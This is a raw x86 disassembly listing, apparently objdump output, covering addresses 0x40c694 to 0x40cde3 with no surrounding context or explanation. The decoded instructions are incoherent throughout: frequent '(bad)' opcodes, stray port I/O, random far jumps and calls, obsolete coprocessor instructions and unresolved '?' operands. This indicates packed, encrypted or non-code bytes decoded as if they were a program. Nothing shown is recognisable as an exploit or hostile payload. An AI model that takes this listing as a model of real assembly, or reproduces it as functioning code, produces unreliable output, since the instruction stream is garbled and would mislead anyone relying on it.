  40c694:	jne    0x40c6cd
  40c696:	lahf   
  40c697:	xchg   ecx,eax
  40c698:	int    0x99
  40c69a:	(bad)  
  40c69b:	jmp    0x40c65c
  40c69d:	jno    0x40c6f5
  40c69f:	mov    eax,ss:0x794375cb
  40c6a5:	xchg   DWORD PTR [eax+0x6f1939cd],edx
  40c6ab:	and    DWORD PTR [edi-0x58],ecx
  40c6ae:	push   ebp
  40c6b0:	cdq    
  40c6b1:	pop    ss
  40c6b2:	sbb    DWORD PTR [edi],edi
  40c6b4:	push   eax
  40c6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6b6:	add    BYTE PTR [eax+0x5b],dh
  40c6b9:	pop    ss
  40c6ba:	push   cs
  40c6bb:	adc    esi,DWORD PTR [ecx-0x26]
  40c6be:	popf   
  40c6bf:	pop    eax
  40c6c0:	enter  0x1058,0xf6
  40c6c4:	fidivr DWORD PTR [ecx+0x34b5f4a6]
  40c6ca:	std    
  40c6cb:	dec    ecx
  40c6cc:	nop
  40c6cd:	(bad)  
  40c6ce:	ins    DWORD PTR es:[edi],dx
  40c6cf:	jmp    0xe3f06426
  40c6d4:	stc    
  40c6d5:	popf   
  40c6d6:	repz adc al,0x95
  40c6d9:	(bad)  
  40c6db:	jo     0x40c6d7
  40c6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6de:	pop    eax
  40c6df:	xchg   esp,eax
  40c6e0:	sahf   
  40c6e1:	fwait
  40c6e2:	hlt    
  40c6e3:	gs popf 
  40c6e5:	retf   0x1c6e
  40c6e8:	push   edx
  40c6e9:	lock sub dh,BYTE PTR [ebx+ecx*1]
  40c6ed:	shr    al,cl
  40c6ef:	test   BYTE PTR ds:0x5b962061,dl
  40c6f5:	out    0xf1,eax
  40c6f7:	shl    cl,cl
  40c6f9:	push   edx
  40c6fa:	adc    eax,0x10e7342d
  40c6ff:	ins    BYTE PTR es:[edi],dx
  40c700:	loopne 0x40c6fe
  40c702:	stc    
  40c703:	mov    ah,0x15
  40c705:	add    al,0x2e
  40c707:	sub    BYTE PTR [eax+0x52257fd6],cl
  40c70d:	es xor dl,0xd2
  40c711:	fwait
  40c712:	(bad)  
  40c713:	push   ds
  40c714:	fild   DWORD PTR [edi+0x4c]
  40c717:	cli    
  40c718:	mov    DWORD PTR [eax],ebx
  40c71a:	fcom   DWORD PTR [ecx-0x77690901]
  40c720:	mov    dh,0x29
  40c722:	adc    bl,dl
  40c724:	mov    dl,0x85
  40c726:	jg     0x40c6ee
  40c728:	sti    
  40c729:	test   BYTE PTR [ebx+0x1441237f],al
  40c72f:	fld    QWORD PTR [esi-0x1a63249c]
  40c735:	xchg   ebx,eax
  40c736:	or     DWORD PTR [ebx-0x2921cdd6],eax
  40c73c:	xlat   BYTE PTR ds:[ebx]
  40c73d:	push   edx
  40c73e:	imul   ebp,DWORD PTR [esi-0x19],0xe
  40c742:	loop   0x40c75c
  40c744:	jmp    0x40c6ce
  40c746:	scas   al,BYTE PTR es:[edi]
  40c747:	xor    eax,0xfc354fe5
  40c74c:	xor    eax,0x1103c685
  40c751:	mov    ch,0xb6
  40c753:	or     esi,edi
  40c755:	cmp    ah,BYTE PTR [ebx-0x38]
  40c758:	lock xchg edi,eax
  40c75b:	ss fsub st(0),st
  40c75e:	imul   esp,esp,0xfffffffb
  40c761:	jle    0x40c7bc
  40c763:	fimul  DWORD PTR [ebp+esi*1+0x77]
  40c767:	test   DWORD PTR [edx+0x12],0xa09d5525
  40c76e:	pusha  
  40c76f:	push   ebx
  40c770:	xor    esi,DWORD PTR [ebx+0x7e]
  40c773:	dec    esp
  40c774:	jns    0x40c7f0
  40c776:	sub    ah,cl
  40c778:	(bad)  
  40c77a:	in     eax,dx
  40c77b:	jbe    0x40c7cf
  40c77d:	adc    ebp,DWORD PTR [edx+0x77fe5cdf]
  40c783:	jb     0x40c799
  40c785:	jecxz  0x40c72f
  40c787:	in     eax,0x46
  40c789:	(bad)  
  40c78a:	adc    edx,DWORD PTR [eax+0x79]
  40c78d:	cs test eax,0x1eea3dbc
  40c793:	add    ecx,DWORD PTR [ebx]
  40c795:	mov    ch,0x2e
  40c797:	clc    
  40c798:	mov    esi,0x8bb68639
  40c79d:	mov    al,ds:0x53f6a642
  40c7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a3:	add    dl,BYTE PTR [esi-0x29]
  40c7a6:	sar    BYTE PTR [edi-0x57],0x60
  40c7aa:	dec    ebp
  40c7ab:	leave  
  40c7ac:	dec    esi
  40c7ad:	jo     0x40c7fe
  40c7af:	in     eax,dx
  40c7b0:	out    dx,al
  40c7b1:	lock push cs
  40c7b3:	pop    esp
  40c7b4:	stc    
  40c7b5:	adc    bh,BYTE PTR [eax]
  40c7b7:	outs   dx,BYTE PTR ds:[esi]
  40c7b8:	pop    ecx
  40c7b9:	mov    ch,0xa1
  40c7bb:	sub    eax,0x95b86b6
  40c7c0:	inc    ebp
  40c7c1:	xor    al,0x1e
  40c7c3:	xchg   ebx,eax
  40c7c4:	sub    ch,dh
  40c7c6:	ja     0x40c7b2
  40c7c8:	mov    ds,WORD PTR [edx-0x67]
  40c7cb:	lods   al,BYTE PTR ds:[esi]
  40c7cc:	or     DWORD PTR [ebp+edx*1+0x5e],ebx
  40c7d0:	jge    0x40c76b
  40c7d2:	mov    ah,0xc6
  40c7d4:	test   al,0x46
  40c7d6:	imul   esp,DWORD PTR [ebx+eax*8-0xd],0x68d9dc9c
  40c7de:	mov    WORD PTR [edi],?
  40c7e0:	lds    edx,FWORD PTR [esi-0x183fba2a]
  40c7e6:	fcmove st,st(5)
  40c7e8:	add    eax,0xfc0a8bb
  40c7ed:	sub    esp,edx
  40c7ef:	int    0xf4
  40c7f1:	mov    al,0x27
  40c7f4:	and    eax,0xaf64a533
  40c7f9:	push   esp
  40c7fa:	add    BYTE PTR [ebp+0x7f401d6f],al
  40c800:	pop    ss
  40c801:	loop   0x40c7a0
  40c803:	test   al,0xf0
  40c805:	out    dx,eax
  40c806:	enter  0x8b0b,0x60
  40c80a:	mov    WORD PTR [ecx],cs
  40c80c:	push   0x42f05724
  40c811:	xchg   esp,eax
  40c812:	(bad)  
  40c813:	xlat   BYTE PTR ds:[ebx]
  40c814:	push   ebx
  40c815:	jge    0x40c7d5
  40c817:	outs   dx,BYTE PTR ds:[esi]
  40c818:	cmp    BYTE PTR [ebx+ebp*2],0x9
  40c81c:	sbb    bh,BYTE PTR [ebx-0x33dca142]
  40c822:	inc    ebp
  40c823:	dec    edi
  40c824:	adc    bl,BYTE PTR [eax]
  40c826:	xor    ecx,DWORD PTR [edx-0x29]
  40c829:	lods   eax,DWORD PTR ds:[esi]
  40c82a:	add    al,0x10
  40c82c:	data16 icebp 
  40c82e:	inc    esp
  40c82f:	fwait
  40c830:	jne    0x40c894
  40c832:	fwait
  40c833:	push   cs
  40c834:	in     al,0x58
  40c836:	cmp    bl,BYTE PTR [edx]
  40c838:	dec    edx
  40c839:	dec    esi
  40c83a:	cmp    ecx,DWORD PTR [eax+0xddf8687]
  40c840:	inc    ebx
  40c841:	mov    ah,0xc5
  40c843:	cli    
  40c844:	ja     0x40c854
  40c846:	sti    
  40c847:	sti    
  40c848:	(bad)  
  40c849:	fist   DWORD PTR [ebx+ebx*1]
  40c84c:	mov    dl,0x33
  40c84e:	xchg   edi,eax
  40c84f:	fnsave [eax-0x22]
  40c852:	aam    0x56
  40c854:	es dec esi
  40c856:	jl     0x40c838
  40c858:	mov    eax,ds:0x27703b55
  40c85d:	(bad)  
  40c85e:	pop    ds
  40c85f:	mov    edi,0x330caeea
  40c864:	and    bh,BYTE PTR [ebx+edi*2]
  40c867:	cmp    BYTE PTR [ebx-0x84e7588],ah
  40c86d:	ror    edx,0x7d
  40c870:	pusha  
  40c871:	dec    ebx
  40c872:	outs   dx,DWORD PTR ds:[esi]
  40c873:	and    al,0xe0
  40c875:	mov    eax,0xed23fa5
  40c87a:	(bad)  
  40c87b:	pop    ebp
  40c87c:	jp     0x40c85f
  40c87e:	jo     0x40c831
  40c880:	popf   
  40c881:	pop    ebx
  40c882:	rcr    DWORD PTR [esi],1
  40c884:	in     eax,dx
  40c885:	cmc    
  40c886:	mov    bh,BYTE PTR [esi-0x7d4c0dbb]
  40c88c:	jl     0x40c8ba
  40c88e:	loop   0x40c81d
  40c890:	mov    ?,eax
  40c892:	in     eax,dx
  40c893:	(bad)  
  40c894:	mov    esp,0xb9acec63
  40c899:	cmp    eax,0x9bfc9e46
  40c89e:	mov    DWORD PTR [esp+ebp*2],esi
  40c8a1:	cdq    
  40c8a2:	mov    eax,ds:0x6a096950
  40c8a7:	pop    ecx
  40c8a8:	in     eax,0xbf
  40c8aa:	adc    eax,0x8927538a
  40c8af:	in     eax,0x16
  40c8b1:	ja     0x40c84b
  40c8b3:	ret    0x8f75
  40c8b6:	test   al,0xc1
  40c8b8:	xor    eax,0xcd11a9dc
  40c8bd:	inc    edi
  40c8be:	fistp  WORD PTR [edx]
  40c8c0:	test   DWORD PTR [ecx],esi
  40c8c2:	aas    
  40c8c3:	xor    eax,0xf0e4baf3
  40c8c8:	sbb    BYTE PTR [edx+0x376bba89],ah
  40c8ce:	and    dh,BYTE PTR [edx]
  40c8d0:	inc    ebx
  40c8d1:	retf   
  40c8d2:	mov    BYTE PTR [ecx],ch
  40c8d4:	out    0xa9,eax
  40c8d6:	pop    edi
  40c8d7:	push   ecx
  40c8d8:	lds    esp,FWORD PTR [edx]
  40c8da:	bound  ebx,QWORD PTR [edi+0x61]
  40c8dd:	in     eax,0x41
  40c8df:	xor    ebp,DWORD PTR [eax+edx*4+0x3d]
  40c8e3:	xor    dl,BYTE PTR [eax+ecx*1]
  40c8e6:	xchg   edi,edx
  40c8e8:	scas   al,BYTE PTR es:[edi]
  40c8e9:	jne    0x40c8fe
  40c8eb:	and    dl,BYTE PTR [eax-0xff2fb2f]
  40c8f1:	adc    ebx,esi
  40c8f3:	mov    edx,0x9447f8f4
  40c8f8:	mov    al,0x97
  40c8fa:	div    DWORD PTR [ebp-0x76]
  40c8fd:	loopne 0x40c979
  40c8ff:	add    al,0xc7
  40c901:	mov    al,ds:0xfd6923e2
  40c906:	das    
  40c907:	sub    al,0xc7
  40c909:	les    ecx,FWORD PTR [esi+0x2]
  40c90c:	mov    edx,0xd8087ef8
  40c911:	leave  
  40c912:	arpl   WORD PTR [edx+0x5d],bp
  40c915:	lahf   
  40c916:	and    DWORD PTR [edx-0xa467efd],ebx
  40c91c:	jmp    0x5237:0x1c5d81e0
  40c923:	sub    dh,bh
  40c925:	mov    ds:0xfe7b6dfe,eax
  40c92a:	jno    0x40c959
  40c92c:	jne    0x40c913
  40c92e:	push   eax
  40c92f:	iret   
  40c930:	adc    BYTE PTR [esi-0x1dc2f03b],dl
  40c936:	ds stc 
  40c938:	popf   
  40c939:	push   esi
  40c93a:	mov    esi,0xaacef2fc
  40c93f:	stc    
  40c940:	adc    DWORD PTR [ecx+edi*8],ecx
  40c943:	mov    cl,0x19
  40c945:	repnz push DWORD PTR [ecx+0x23966926]
  40c94c:	inc    edi
  40c94d:	add    al,0xae
  40c94f:	pop    edx
  40c950:	in     eax,0x98
  40c952:	repz xor dh,BYTE PTR [ecx]
  40c955:	and    al,0x7
  40c957:	pop    ecx
  40c958:	push   edi
  40c959:	enter  0x9b9b,0x60
  40c95d:	repz into 
  40c95f:	jb     0x40c95f
  40c961:	pop    edx
  40c962:	adc    DWORD PTR [edx+0x4fe1fbeb],ebp
  40c968:	add    al,0xee
  40c96a:	sub    dh,BYTE PTR [ebx]
  40c96c:	cmp    al,0x25
  40c96e:	or     al,0x60
  40c970:	sbb    eax,0x9c5bd149
  40c975:	mov    esp,0xe86b184c
  40c97a:	retf   0xafa0
  40c97d:	stc    
  40c97e:	inc    ecx
  40c97f:	mov    edi,0x2a1a7f3a
  40c984:	dec    eax
  40c985:	rol    dh,1
  40c987:	inc    eax
  40c988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c989:	shl    DWORD PTR [ebx-0x33],cl
  40c98c:	mov    ch,BYTE PTR ds:0x86ef34ff
  40c992:	fwait
  40c993:	mov    al,0xd8
  40c995:	cld    
  40c996:	fnstcw WORD PTR [edi+0x1a]
  40c999:	pop    es
  40c99a:	xchg   esi,eax
  40c99b:	mov    ebp,0x2d7c7ab7
  40c9a0:	jg     0x40c9bd
  40c9a2:	mov    DWORD PTR [eax],edi
  40c9a4:	loope  0x40ca0b
  40c9a6:	and    esp,DWORD PTR [ebp-0x5b]
  40c9a9:	push   0x4ed7910d
  40c9ae:	xor    BYTE PTR [eax-0xdc7dfea],ch
  40c9b4:	arpl   sp,sp
  40c9b6:	test   al,0x16
  40c9b8:	out    dx,al
  40c9b9:	adc    DWORD PTR [ecx+0x182c697e],edx
  40c9bf:	(bad)  
  40c9c0:	cwde   
  40c9c1:	dec    ebp
  40c9c2:	fdiv   QWORD PTR [esi-0x6eb69fa5]
  40c9c8:	imul   ecx,ebp,0x3e
  40c9cb:	ins    BYTE PTR es:[edi],dx
  40c9cc:	jo     0x40ca4b
  40c9ce:	cdq    
  40c9cf:	mov    ?,esp
  40c9d1:	sbb    cl,BYTE PTR [ebp-0x196be12c]
  40c9d7:	dec    eax
  40c9d8:	push   ds
  40c9d9:	adc    esi,DWORD PTR [edx]
  40c9db:	retf   0x680b
  40c9de:	(bad)  
  40c9df:	sbb    BYTE PTR [ebp+0x27],dl
  40c9e2:	push   edi
  40c9e3:	cwde   
  40c9e4:	sbb    al,0x62
  40c9e6:	mov    ecx,0x89d2ebcc
  40c9eb:	and    ch,BYTE PTR [edi+0xb5a94e3]
  40c9f1:	je     0x40c987
  40c9f3:	add    eax,0x86c1e278
  40c9f8:	jecxz  0x40c9da
  40c9fa:	xor    eax,DWORD PTR [ebx+edi*2]
  40c9fd:	loop   0x40ca4e
  40c9ff:	xchg   esi,eax
  40ca00:	mov    DWORD PTR [ebx],esp
  40ca02:	cmp    BYTE PTR [ebx],bl
  40ca04:	push   ecx
  40ca05:	push   0x67
  40ca07:	dec    edi
  40ca08:	add    DWORD PTR [eax-0x1b472358],ebx
  40ca0e:	out    dx,al
  40ca0f:	mov    edi,0x5c611324
  40ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca15:	outs   dx,DWORD PTR ds:[esi]
  40ca16:	add    eax,0xa4077e1e
  40ca1b:	mov    ds:0x18b80fda,al
  40ca20:	mov    WORD PTR [eax-0x2ac04fc8],gs
  40ca26:	xchg   ebp,eax
  40ca27:	cs ja  0x40ca94
  40ca2a:	inc    ebp
  40ca2b:	vpsubd xmm2,xmm0,xmm3
  40ca2f:	pop    es
  40ca30:	and    al,0x78
  40ca32:	cmp    BYTE PTR [edi-0x2f],bl
  40ca35:	ins    DWORD PTR es:[edi],dx
  40ca36:	jb     0x40ca6d
  40ca38:	push   edi
  40ca39:	std    
  40ca3a:	jne    0x40ca3c
  40ca3c:	fdiv   DWORD PTR [esi+0x31670082]
  40ca42:	cdq    
  40ca43:	mov    edi,0xb3fac2ad
  40ca48:	data16 mov ds,WORD PTR [ebx]
  40ca4b:	adc    edx,DWORD PTR [esi-0x3c7c7ed4]
  40ca51:	or     al,0xd8
  40ca53:	pop    edi
  40ca54:	dec    ecx
  40ca55:	jne    0x40ca9c
  40ca57:	adc    eax,0x19
  40ca5a:	out    0x3,al
  40ca5c:	jp     0x40ca4e
  40ca5e:	inc    esp
  40ca5f:	jnp    0x40ca3b
  40ca61:	fld    QWORD PTR [edi+0x286090aa]
  40ca67:	cmp    BYTE PTR [eax],cl
  40ca69:	push   cs
  40ca6a:	mov    esp,0x5adc8fd4
  40ca6f:	pop    eax
  40ca70:	add    eax,edx
  40ca72:	mov    eax,ds:0x18f90099
  40ca77:	mov    dl,0x12
  40ca79:	test   eax,0x413e908a
  40ca7e:	dec    esi
  40ca7f:	mov    edi,0x3b711f00
  40ca84:	xor    BYTE PTR [esi],dl
  40ca86:	fadd   QWORD PTR [edi+0xc]
  40ca89:	xchg   edx,eax
  40ca8a:	xchg   esp,eax
  40ca8b:	jge    0x40cab2
  40ca8d:	rcr    BYTE PTR [edx+0x6a563615],cl
  40ca93:	dec    eax
  40ca94:	push   edi
  40ca95:	mov    DWORD PTR [ecx],esp
  40ca97:	dec    esp
  40ca98:	mov    ecx,0xc93bcf66
  40ca9d:	cmp    esi,DWORD PTR [edi+0x50]
  40caa0:	retf   
  40caa1:	jmp    0xd78a9fda
  40caa6:	sbb    eax,0xbe4211ff
  40caab:	push   ecx
  40caac:	in     eax,0xcc
  40caae:	fsubr  st,st(2)
  40cab0:	mov    al,0x24
  40cab2:	sbb    al,0x55
  40cab4:	mov    ch,0x56
  40cab6:	mov    edx,0x3be14cb6
  40cabb:	sbb    ch,dh
  40cabd:	test   BYTE PTR [ebp+0x1b],cl
  40cac0:	nop
  40cac1:	add    DWORD PTR [ebp-0x7d],0xc74c51d
  40cac8:	jge    0x40cb1a
  40caca:	ret    0xf8c8
  40cacd:	inc    ebx
  40cace:	iret   
  40cacf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad0:	(bad)  
  40cad1:	packsswb mm5,QWORD PTR [edx-0x51]
  40cad5:	mov    ch,0x3
  40cad7:	add    cl,BYTE PTR [eax-0x2b]
  40cada:	lea    eax,[eax-0x1c5a3f39]
  40cae0:	sbb    eax,0x6e09309a
  40cae5:	mov    ds,esi
  40cae7:	fisub  WORD PTR [ecx]
  40cae9:	mov    edx,DWORD PTR [ebp+ebp*2-0xe]
  40caed:	cmp    eax,0x588c8ef3
  40caf2:	add    eax,0xd23451b4
  40caf7:	mov    al,BYTE PTR [ecx]
  40caf9:	addr16 mov ds:0x2c9f,al
  40cafd:	scas   eax,DWORD PTR es:[edi]
  40cafe:	sbb    BYTE PTR [edi],dl
  40cb00:	xor    DWORD PTR [eax-0x2e43630a],ebx
  40cb06:	dec    cl
  40cb08:	outs   dx,BYTE PTR ds:[esi]
  40cb09:	fst    DWORD PTR cs:[ebx+0x70]
  40cb0d:	popa   
  40cb0e:	lods   al,BYTE PTR ds:[esi]
  40cb0f:	pushf  
  40cb10:	(bad)  
  40cb11:	xor    DWORD PTR [ebx],eax
  40cb13:	mov    al,0x5
  40cb15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb16:	inc    esp
  40cb17:	fist   WORD PTR [esi+0x64]
  40cb1a:	hlt    
  40cb1b:	xor    BYTE PTR [ecx-0x14],bl
  40cb1e:	xchg   BYTE PTR [eax],bh
  40cb20:	(bad)  [ecx]
  40cb22:	pop    ds
  40cb23:	jg     0x40cb31
  40cb25:	xchg   edx,eax
  40cb26:	rcr    DWORD PTR [ebx-0x3c],0xab
  40cb2a:	lods   ax,WORD PTR ds:[esi]
  40cb2c:	addr16 xor eax,0xff40bf91
  40cb32:	and    eax,0x3e4ae2ec
  40cb37:	mov    ds:0xac3015c6,eax
  40cb3c:	jmp    0x5875df75
  40cb41:	outs   dx,DWORD PTR ds:[esi]
  40cb42:	leave  
  40cb43:	pushf  
  40cb44:	out    dx,al
  40cb45:	cmp    DWORD PTR [ebx+edx*4],0xffffffd4
  40cb49:	push   ds
  40cb4a:	shl    DWORD PTR [eax+0x5d09257d],0x5d
  40cb51:	lahf   
  40cb52:	pop    ds
  40cb53:	enter  0x58fc,0xd9
  40cb57:	std    
  40cb58:	fmul   DWORD PTR [ecx+eax*2-0x19af41cd]
  40cb5f:	jnp    0x40cb58
  40cb61:	and    ebp,ecx
  40cb63:	inc    edx
  40cb64:	or     cl,BYTE PTR [ecx-0x471a20e7]
  40cb6a:	das    
  40cb6b:	test   eax,0x873ad718
  40cb70:	pop    ecx
  40cb71:	ret    0x8529
  40cb74:	aaa    
  40cb75:	addr16 jmp 0x75bb3aca
  40cb7b:	sbb    DWORD PTR [edi+0x7bf65aa3],ebp
  40cb81:	or     esp,DWORD PTR [eax]
  40cb83:	mov    esp,0xfa712f14
  40cb88:	add    eax,0xcc29a622
  40cb8d:	sbb    eax,0xb950f1c9
  40cb92:	mov    bl,0x5e
  40cb94:	xor    dl,BYTE PTR [ebx-0x3e74cb20]
  40cb9a:	call   0xa289:0xcb7777f7
  40cba1:	inc    esp
  40cba2:	push   cs
  40cba3:	and    BYTE PTR [edx-0x69],dl
  40cba6:	ins    BYTE PTR es:[edi],dx
  40cba7:	stos   DWORD PTR es:[edi],eax
  40cba8:	add    esp,eax
  40cbaa:	or     dh,ah
  40cbac:	push   edi
  40cbad:	mov    ah,0x6
  40cbaf:	lods   eax,DWORD PTR ds:[esi]
  40cbb0:	popf   
  40cbb1:	loop   0x40cb5e
  40cbb3:	add    ch,bl
  40cbb5:	stos   BYTE PTR es:[edi],al
  40cbb6:	in     al,dx
  40cbb7:	cwde   
  40cbb8:	mov    BYTE PTR [edx+0x65],cl
  40cbbb:	call   0x9f482fff
  40cbc0:	clc    
  40cbc1:	outs   dx,BYTE PTR ds:[esi]
  40cbc2:	push   ds
  40cbc3:	mov    edi,0x8e44239c
  40cbc8:	les    esp,FWORD PTR [edx-0x697b731e]
  40cbce:	fidivr DWORD PTR [edx]
  40cbd0:	inc    BYTE PTR [edi-0x41]
  40cbd3:	ret    0x7194
  40cbd6:	and    eax,0x596376a2
  40cbdb:	push   es
  40cbdc:	jmp    0x87db:0xbe84632d
  40cbe3:	or     al,0x54
  40cbe5:	push   ecx
  40cbe6:	enter  0x8e8c,0x61
  40cbea:	fidivr WORD PTR [edx+0x53]
  40cbed:	mov    ds:0x9487d13d,al
  40cbf2:	aam    0x52
  40cbf4:	sub    BYTE PTR [eax+0x26],dh
  40cbf7:	xor    al,0x87
  40cbf9:	ret    
  40cbfa:	inc    esi
  40cbfb:	adc    eax,0xd7c5c239
  40cc00:	imul   esp,DWORD PTR [ebx+0x39],0x69
  40cc04:	or     ah,0xcb
  40cc07:	fiadd  DWORD PTR [ecx+0x59]
  40cc0a:	inc    ebx
  40cc0b:	pop    esi
  40cc0c:	push   ebx
  40cc0d:	int    0x4e
  40cc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc10:	rcl    BYTE PTR [eax],cl
  40cc12:	and    al,0x9e
  40cc14:	idiv   DWORD PTR [ebx+0x59]
  40cc17:	cmp    BYTE PTR [edi+ecx*2],dl
  40cc1a:	or     DWORD PTR [esi+0x445b72aa],edx
  40cc20:	lds    edi,FWORD PTR [edx+0x44]
  40cc23:	xlat   BYTE PTR ds:[ebx]
  40cc24:	cmp    eax,0xbaffeccc
  40cc29:	loop   0x40cbee
  40cc2b:	push   cs
  40cc2c:	xor    al,0xdf
  40cc2e:	adc    bl,0xd3
  40cc31:	or     DWORD PTR [ebp*1+0x32a6bdba],edi
  40cc38:	shl    BYTE PTR [ecx+0x49],cl
  40cc3b:	push   edx
  40cc3c:	xor    esp,DWORD PTR ds:0xdf7ba2e7
  40cc42:	popa   
  40cc43:	nop
  40cc44:	sub    al,0x51
  40cc46:	ror    DWORD PTR [esi-0x1eb30f93],0xa4
  40cc4d:	rol    DWORD PTR [esi],0x27
  40cc50:	aas    
  40cc51:	(bad)  
  40cc52:	out    0xe1,al
  40cc54:	cmp    esp,DWORD PTR [eax+0x52b46a78]
  40cc5a:	push   ebp
  40cc5b:	cmp    bl,BYTE PTR [esi]
  40cc5d:	add    ecx,DWORD PTR [ecx+0x280e3d21]
  40cc63:	mov    ch,0x2a
  40cc65:	sar    BYTE PTR [ebx-0x11f88a17],cl
  40cc6b:	jbe    0x40cc53
  40cc6d:	loop   0x40cc04
  40cc6f:	fst    QWORD PTR [ebx+edx*8-0x15e48678]
  40cc76:	xor    al,BYTE PTR [edi]
  40cc78:	and    al,0xca
  40cc7a:	retf   
  40cc7b:	push   0x1d
  40cc7d:	daa    
  40cc7e:	xchg   DWORD PTR [ecx-0x49],esi
  40cc81:	jmp    0x40cc2f
  40cc83:	les    edi,FWORD PTR [eax]
  40cc85:	and    ebp,DWORD PTR [edi-0x4c5c8db3]
  40cc8b:	push   ecx
  40cc8c:	cdq    
  40cc8d:	outs   dx,BYTE PTR ds:[esi]
  40cc8e:	popf   
  40cc8f:	fsub   DWORD PTR [edx]
  40cc91:	shl    BYTE PTR [ebx+0x6],1
  40cc94:	dec    eax
  40cc95:	lods   al,BYTE PTR ds:[esi]
  40cc96:	inc    esi
  40cc97:	xchg   edx,eax
  40cc98:	add    BYTE PTR [esi],al
  40cc9a:	pop    ss
  40cc9b:	inc    eax
  40cc9c:	pushf  
  40cc9d:	in     al,0x87
  40cc9f:	lahf   
  40cca0:	test   al,0x9
  40cca2:	xchg   BYTE PTR [esi],ah
  40cca4:	fidivr WORD PTR fs:[ebx+0x77673a04]
  40ccab:	mov    al,ds:0x405b9bb0
  40ccb0:	sbb    ah,BYTE PTR [eax+0x4d]
  40ccb3:	xchg   ecx,eax
  40ccb4:	inc    esi
  40ccb5:	add    eax,0x5d36ac4a
  40ccba:	push   0x1c
  40ccbc:	push   0xa646353e
  40ccc1:	pop    esi
  40ccc2:	sub    eax,0x3773d50d
  40ccc7:	adc    al,bh
  40ccc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccca:	or     edi,DWORD PTR [ebp-0x4a5ba1f]
  40ccd0:	cs jmp 0x7628:0x1c9b1cda
  40ccd8:	jo     0x40ccac
  40ccda:	(bad)  
  40ccdb:	aas    
  40ccdc:	mov    dl,al
  40ccde:	fneni(8087 only) 
  40cce0:	add    ah,0x6e
  40cce3:	sub    dh,BYTE PTR [ebx]
  40cce5:	inc    ebp
  40cce6:	push   ecx
  40cce7:	lock push es
  40cce9:	push   ss
  40ccea:	xchg   edi,eax
  40cceb:	pop    ecx
  40ccec:	or     eax,0x3bc75b74
  40ccf1:	push   edx
  40ccf2:	push   0x9637e2cb
  40ccf7:	xor    edx,DWORD PTR [esi]
  40ccf9:	cmp    al,BYTE PTR [ecx-0x76]
  40ccfc:	push   edi
  40ccfd:	cwde   
  40ccfe:	scas   eax,DWORD PTR es:[edi]
  40ccff:	inc    eax
  40cd00:	adc    edx,DWORD PTR [edx]
  40cd02:	pushf  
  40cd03:	sub    al,0x8f
  40cd05:	call   0x4e88:0xff84e548
  40cd0c:	add    dl,BYTE PTR [edx+ebp*1-0x2144aac3]
  40cd13:	mov    esi,ecx
  40cd15:	mov    WORD PTR [ecx-0x42],gs
  40cd18:	jns    0x40cd97
  40cd1a:	pop    ebp
  40cd1b:	pop    ds
  40cd1c:	xchg   ebp,eax
  40cd1d:	jbe    0x40ccca
  40cd1f:	pushf  
  40cd20:	mov    ebx,0x64d52444
  40cd25:	hlt    
  40cd26:	rol    DWORD PTR [eax],1
  40cd28:	inc    ebp
  40cd29:	cwde   
  40cd2a:	xor    ch,ch
  40cd2c:	jecxz  0x40cd87
  40cd2e:	xor    BYTE PTR [edx],0xdf
  40cd31:	mov    ?,WORD PTR ds:0x6f4837d9
  40cd37:	pop    ecx
  40cd38:	jge    0x40cd6b
  40cd3a:	inc    ebp
  40cd3b:	mov    dl,0x6d
  40cd3d:	mov    BYTE PTR [eax-0x16],bl
  40cd40:	jl     0x40cd44
  40cd42:	and    eax,0x303a3d15
  40cd47:	test   BYTE PTR [esi-0x34861d],dh
  40cd4d:	into   
  40cd4e:	adc    al,0xd6
  40cd50:	xchg   edi,eax
  40cd51:	adc    al,dl
  40cd53:	lods   eax,DWORD PTR ds:[esi]
  40cd54:	loope  0x40ccf8
  40cd56:	gs in  eax,0xaf
  40cd59:	adc    bh,bh
  40cd5b:	mov    edx,0xd1aad8a9
  40cd60:	jl     0x40cdc3
  40cd62:	cli    
  40cd63:	pop    ebx
  40cd64:	aaa    
  40cd65:	add    eax,0xb1141a50
  40cd6a:	mov    eax,ds:0x9a42c264
  40cd6f:	seta   cl
  40cd72:	mov    eax,ds:0x1248d2bf
  40cd77:	jo     0x40cd9d
  40cd79:	cmp    DWORD PTR [ebp+0x50],0xf306db7a
  40cd80:	out    dx,al
  40cd81:	in     al,dx
  40cd82:	int    0x6b
  40cd84:	int    0x34
  40cd86:	jp     0x40cdcb
  40cd88:	mov    bh,0xc8
  40cd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd8b:	jmp    0xad2e:0x8a725f5f
  40cd92:	lods   al,BYTE PTR ds:[esi]
  40cd93:	ss cdq 
  40cd95:	shrd   DWORD PTR [esi],esi,cl
  40cd98:	and    bh,BYTE PTR [edi]
  40cd9a:	aad    0x3f
  40cd9c:	xchg   ebp,eax
  40cd9d:	jo     0x40cde8
  40cd9f:	sbb    eax,0xa0d00f2d
  40cda4:	push   edi
  40cda5:	in     eax,dx
  40cda6:	dec    esp
  40cda7:	mov    ds:0xcec23c2f,al
  40cdac:	add    eax,0x1b487520
  40cdb1:	xchg   edx,eax
  40cdb2:	ja     0x40ce0b
  40cdb4:	jne    0x40cd65
  40cdb6:	mov    BYTE PTR [ebp+0x1b],bl
  40cdb9:	aas    
  40cdba:	pop    ss
  40cdbb:	hlt    
  40cdbc:	std    
  40cdbd:	int3   
  40cdbe:	mov    al,0x63
  40cdc0:	mov    edi,0x13fae6a9
  40cdc5:	in     eax,0x28
  40cdc7:	addr16 jle 0x40cdf6
  40cdca:	sbb    BYTE PTR [ebx],bl
  40cdcc:	nop
  40cdcd:	cmp    eax,0xa5c64156
  40cdd2:	mov    edx,0xa89a86a
  40cdd7:	xchg   esp,eax
  40cdd8:	xchg   edx,eax
  40cdd9:	xchg   ebx,esi
  40cddb:	fwait
  40cddc:	mov    DWORD PTR [eax],0xe779d8d6
  40cde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cde3:	xchg   BYTE PTR [eax-0x1a],dh
